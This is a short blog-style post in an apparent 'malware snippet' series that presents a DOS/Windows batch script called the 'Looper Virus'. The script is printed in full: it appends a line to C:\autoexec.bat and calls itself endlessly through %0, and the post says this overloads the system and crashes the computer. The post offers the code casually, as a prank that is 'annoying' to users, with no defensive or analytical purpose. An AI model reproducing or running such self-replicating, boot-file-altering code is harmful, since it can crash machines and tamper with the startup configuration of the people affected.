Almost-Daily Malware Snippet: The Looper Virus

The Looper Virus is more of a fork bomb really. It overloads the system and crashes the computer (DOS and Windows only!) 
Here's its code: 

@echo off 
echo echo Ctrl-er >> C:\autoexec.bat 
%0 

It's super simple but can be annoying to DOS/Windows users!
